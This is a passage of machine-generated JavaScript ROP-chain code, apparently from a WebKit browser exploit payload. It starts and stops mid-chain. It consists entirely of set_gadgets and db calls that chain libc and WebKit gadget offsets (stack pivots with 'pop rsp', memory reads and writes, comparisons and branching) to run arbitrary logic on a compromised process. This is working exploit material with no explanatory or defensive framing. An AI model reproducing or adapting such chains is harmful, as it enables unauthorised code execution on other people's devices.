//L5094:
db([4294967028,4294967295]);// -0x10c
set_gadget(libc_base+772328,);
//L5096:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+286544,//L5098
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+286560,//L5099
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5098:
db([0,0]);
set_gadget(libc_base+772328,);
//L5099:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+286720,//L5101
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+286752,//L5103
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+286704,//L5100
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+286736,//L5102
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5100:
db([0,0]);
set_gadget(libc_base+165442,);
//L5101:
db([0,0]);
set_gadget(libc_base+772328,);
//L5102:
db([0,0]);
set_gadget(libc_base+768796,);
//L5103:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+286848,//L5105
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+286832,//L5104
webkit_base+4687784,
libc_base+165442
]);
//L5104:
db([0,0]);
set_gadget(libc_base+768796,);
//L5105:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+286936,//L5107
webkit_base+4687784,
libc_base+713278
]);
//L5106:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L5107:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+287008,//L5110
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5108:
db([4294967028,4294967295]);// -0x10c
set_gadget(libc_base+772328,);
//L5110:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+287072,//L5112
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5112:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+489696,//pop rsp
ropchain+278152,//L4889
//L4922:
libc_base+713278,
ropchain+287184,//L5115
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5113:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L5115:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+287272,//L5117
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+287288,//L5118
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5117:
db([0,0]);
set_gadget(libc_base+772328,);
//L5118:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+287432,//L5121
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+287448,//L5122
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+287416,//L5120
webkit_base+4687784,
libc_base+713278
]);
//L5119:
db([16,0]);// 0x10
set_gadget(libc_base+165442,);
//L5120:
db([0,0]);
set_gadget(libc_base+772328,);
//L5121:
db([0,0]);
set_gadget(libc_base+768796,);
//L5122:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+287536,//L5124
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+287552,//L5125
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5124:
db([0,0]);
set_gadget(libc_base+772328,);
//L5125:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+287712,//L5127
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+287744,//L5129
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+287696,//L5126
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+287728,//L5128
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5126:
db([0,0]);
set_gadget(libc_base+165442,);
//L5127:
db([0,0]);
set_gadget(libc_base+772328,);
//L5128:
db([0,0]);
set_gadget(libc_base+768796,);
//L5129:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+287840,//L5131
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+287824,//L5130
webkit_base+4687784,
libc_base+165442
]);
//L5130:
db([0,0]);
set_gadget(libc_base+768796,);
//L5131:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L5133:
ropchain+287944,//L5132
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+174016,//_get_tclass
//L5132:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+288088,//L5135
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+288104,//L5136
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+288072,//L5134
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5134:
db([0,0]);
set_gadget(libc_base+165442,);
//L5135:
db([0,0]);
set_gadget(libc_base+768796,);
//L5136:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+288224,//L5140
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+288208,//L5139
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5137:
db([4294967032,4294967295]);// -0x108
set_gadget(libc_base+165442,);
//L5139:
db([0,0]);
set_gadget(libc_base+772328,);
//L5140:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5141:
db([4294967032,4294967295]);// -0x108
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+288352,//L5144
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+288368,//L5145
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5144:
db([0,0]);
set_gadget(libc_base+772328,);
//L5145:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+288528,//L5147
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+288560,//L5149
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+288512,//L5146
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+288544,//L5148
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5146:
db([0,0]);
set_gadget(libc_base+165442,);
//L5147:
db([0,0]);
set_gadget(libc_base+772328,);
//L5148:
db([0,0]);
set_gadget(libc_base+768796,);
//L5149:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+288640,//L5150
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+288656,//L5151
webkit_base+4687784,
libc_base+165442
]);
//L5150:
db([0,0]);
set_gadget(libc_base+768796,);
//L5151:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+288752,//L5153
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+288736,//L5152
webkit_base+4687784,
libc_base+165442
]);
//L5152:
db([0,0]);
set_gadget(libc_base+768796,);
//L5153:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5155:
db([4294901760,4294967295]);// -0x10000
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+288864,//L5157
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5157:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+5236215,//and rax,rcx
libc_base+713278,
ropchain+289000,//L5160
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+288968,//L5158
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5158:
db([0,0]);
set_gadget(libc_base+772328,);
//L5159:
db([32,0]);// 0x20
set_gadget(libc_base+768796,);
//L5160:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+289104,//L5162
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+289088,//L5161
webkit_base+4687784,
libc_base+772328
]);
//L5161:
db([0,0]);
set_gadget(libc_base+768796,);
//L5162:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+289200,//L5165
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5163:
db([32,0]);// 0x20
set_gadget(libc_base+772328,);
//L5165:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+289288,//L5167
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+289304,//L5168
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5167:
db([0,0]);
set_gadget(libc_base+772328,);
//L5168:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+289464,//L5170
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+289496,//L5172
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+289448,//L5169
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+289480,//L5171
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5169:
db([0,0]);
set_gadget(libc_base+165442,);
//L5170:
db([0,0]);
set_gadget(libc_base+772328,);
//L5171:
db([0,0]);
set_gadget(libc_base+768796,);
//L5172:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+289576,//L5173
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+289592,//L5174
webkit_base+4687784,
libc_base+165442
]);
//L5173:
db([0,0]);
set_gadget(libc_base+768796,);
//L5174:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+289752,//L5178
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+289704,//L5175
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+289720,//L5176
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5175:
db([0,0]);
set_gadget(libc_base+165442,);
//L5176:
db([0,0]);
set_gadget(libc_base+772328,);
//L5177:
db([32,0]);// 0x20
set_gadget(libc_base+768796,);
//L5178:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+289840,//L5179
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+289856,//L5180
webkit_base+4687784,
libc_base+772328
]);
//L5179:
db([0,0]);
set_gadget(libc_base+768796,);
//L5180:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+15055763,//cmp rax,rcx ;sete al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+290024,//L5182
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+290040,//L5183
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+290008,//L5181
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5181:
db([0,0]);
set_gadget(libc_base+165442,);
//L5182:
db([0,0]);
set_gadget(libc_base+768796,);
//L5183:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+290168,//L5186
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+290200,//L5188
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+290184,//L5187
webkit_base+4687784,
libc_base+713278
]);
//L5185:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L5186:
db([0,0]);
set_gadget(libc_base+165442,);
//L5187:
db([0,0]);
set_gadget(libc_base+768796,);
//L5188:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+290312,//L5189+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+290304,//L5189
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L5189:
db([0,0]);
set_gadgets([
ropchain+290328,//L5189+24
ropchain+290344,//L5184
libc_base+489696,//pop rsp
ropchain+295800,//L5190
//L5184:
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5191:
db([4294967024,4294967295]);// -0x110
set_gadget(libc_base+772328,);
//L5193:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+290440,//L5195
webkit_base+4687784,
libc_base+772328
]);
//L5194:
db([0,0]);
set_gadget(libc_base+768796,);
//L5195:
db([0,0]);
set_gadgets([
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+290496,//L5198
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5198:
db([0,0]);
//L5196:
set_gadgets([
libc_base+713278,
ropchain+290560,//L5201
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5199:
db([4294967024,4294967295]);// -0x110
set_gadget(libc_base+772328,);
//L5201:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+290648,//L5203
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+290664,//L5204
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5203:
db([0,0]);
set_gadget(libc_base+772328,);
//L5204:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+290824,//L5206
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+290856,//L5208
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+290808,//L5205
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+290840,//L5207
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5205:
db([0,0]);
set_gadget(libc_base+165442,);
//L5206:
db([0,0]);
set_gadget(libc_base+772328,);
//L5207:
db([0,0]);
set_gadget(libc_base+768796,);
//L5208:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+290936,//L5209
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+290952,//L5210
webkit_base+4687784,
libc_base+165442
]);
//L5209:
db([0,0]);
set_gadget(libc_base+768796,);
//L5210:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+291048,//L5212
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+291032,//L5211
webkit_base+4687784,
libc_base+165442
]);
//L5211:
db([0,0]);
set_gadget(libc_base+768796,);
//L5212:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+291144,//L5214
webkit_base+4687784,
libc_base+768796
]);
//L5213:
db([32,0]);// 0x20
set_gadget(webkit_base+3789839,);//pop r11
//L5214:
db([0,0]);
set_gadget(libc_base+165442,);
//L5215:
db([32,0]);// 0x20
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+291288,//L5217
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+291304,//L5218
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+291272,//L5216
webkit_base+4687784,
libc_base+165442
]);
//L5216:
db([0,0]);
set_gadget(libc_base+772328,);
//L5217:
db([0,0]);
set_gadget(libc_base+768796,);
//L5218:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+15055763,//cmp rax,rcx ;sete al
webkit_base+47019,//setl al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+291480,//L5220
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+291496,//L5221
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+291464,//L5219
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5219:
db([0,0]);
set_gadget(libc_base+165442,);
//L5220:
db([0,0]);
set_gadget(libc_base+768796,);
//L5221:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+291624,//L5224
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+291656,//L5226
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+291640,//L5225
webkit_base+4687784,
libc_base+713278
]);
//L5223:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L5224:
db([0,0]);
set_gadget(libc_base+165442,);
//L5225:
db([0,0]);
set_gadget(libc_base+768796,);
//L5226:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+291768,//L5227+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+291760,//L5227
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L5227:
db([0,0]);
set_gadgets([
ropchain+291784,//L5227+24
ropchain+291800,//L5222
libc_base+489696,//pop rsp
ropchain+291816,//L5228
//L5222:
libc_base+489696,//pop rsp
ropchain+295784,//L5229
//L5228:
libc_base+768796
]);
//L5230:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L5231:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L5232:
db([51,0]);// 0x33
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L5233:
db([41,0]);// 0x29
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+292064,//L5236
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5234:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L5236:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+292152,//L5238
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+292168,//L5239
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5238:
db([0,0]);
set_gadget(libc_base+772328,);
//L5239:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+292312,//L5242
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+292328,//L5243
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+292296,//L5241
webkit_base+4687784,
libc_base+713278
]);
//L5240:
db([24,0]);// 0x18
set_gadget(libc_base+165442,);
//L5241:
db([0,0]);
set_gadget(libc_base+772328,);
//L5242:
db([0,0]);
set_gadget(libc_base+768796,);
//L5243:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+292416,//L5245
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+292432,//L5246
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5245:
db([0,0]);
set_gadget(libc_base+772328,);
//L5246:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+292576,//L5249
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+292544,//L5247
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+292560,//L5248
webkit_base+4687784,
libc_base+165442
]);
//L5247:
db([0,0]);
set_gadget(libc_base+772328,);
//L5248:
db([0,0]);
set_gadget(libc_base+768796,);
//L5249:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+292648,//L5251
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5251:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+292704,//L5253
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5253:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+292800,//L5256
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5254:
db([4294967024,4294967295]);// -0x110
set_gadget(libc_base+772328,);
//L5256:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+292888,//L5258
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+292904,//L5259
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5258:
db([0,0]);
set_gadget(libc_base+772328,);
//L5259:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+293064,//L5261
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+293096,//L5263
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+293048,//L5260
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+293080,//L5262
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5260:
db([0,0]);
set_gadget(libc_base+165442,);
//L5261:
db([0,0]);
set_gadget(libc_base+772328,);
//L5262:
db([0,0]);
set_gadget(libc_base+768796,);
//L5263:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+293256,//L5267
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+293208,//L5264
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+293224,//L5265
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5264:
db([0,0]);
set_gadget(libc_base+165442,);
//L5265:
db([0,0]);
set_gadget(libc_base+772328,);
//L5266:
db([4,0]);// 0x4
set_gadget(libc_base+768796,);
//L5267:
db([0,0]);
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+293336,//L5268
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+293352,//L5269
webkit_base+4687784,
libc_base+772328
]);
//L5268:
db([0,0]);
set_gadget(libc_base+768796,);
//L5269:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+293440,//L5271
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5271:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+293496,//L5273
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5273:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+293624,//L5274
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+293656,//L5276
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+293640,//L5275
webkit_base+4687784,
libc_base+165442
]);
//L5274:
db([0,0]);
set_gadget(libc_base+772328,);
//L5275:
db([0,0]);
set_gadget(libc_base+768796,);
//L5276:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+293816,//L5278
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+293848,//L5280
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+293800,//L5277
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+293832,//L5279
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5277:
db([0,0]);
set_gadget(libc_base+165442,);
//L5278:
db([0,0]);
set_gadget(libc_base+772328,);
//L5279:
db([0,0]);
set_gadget(libc_base+768796,);
//L5280:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+293928,//L5281
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+293944,//L5282
webkit_base+4687784,
libc_base+165442
]);
//L5281:
db([0,0]);
set_gadget(libc_base+768796,);
//L5282:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+294040,//L5284
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+294024,//L5283
webkit_base+4687784,
libc_base+165442
]);
//L5283:
db([0,0]);
set_gadget(libc_base+768796,);
//L5284:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L5286:
ropchain+294144,//L5285
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+297248,//L4355
//L5285:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+294288,//L5288
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+294304,//L5289
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+294272,//L5287
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5287:
db([0,0]);
set_gadget(libc_base+165442,);
//L5288:
db([0,0]);
set_gadget(libc_base+768796,);
//L5289:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+294432,//L5292
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+294464,//L5294
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+294448,//L5293
webkit_base+4687784,
libc_base+713278
]);
//L5291:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L5292:
db([0,0]);
set_gadget(libc_base+165442,);
//L5293:
db([0,0]);
set_gadget(libc_base+768796,);
//L5294:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+294576,//L5295+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+294568,//L5295
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L5295:
db([0,0]);
set_gadgets([
ropchain+294592,//L5295+24
ropchain+295056,//L5290
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+294664,//L5298
webkit_base+4687784,
libc_base+768796
]);
//L5296:
db([0,0]);
set_gadget(libc_base+165442,);
//L5297:
db([0,0]);
set_gadget(libc_base+772328,);
//L5298:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+294824,//L5300
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+294856,//L5302
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+294808,//L5299
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+294840,//L5301
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5299:
db([0,0]);
set_gadget(libc_base+165442,);
//L5300:
db([0,0]);
set_gadget(libc_base+772328,);
//L5301:
db([0,0]);
set_gadget(libc_base+768796,);
//L5302:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+294936,//L5303
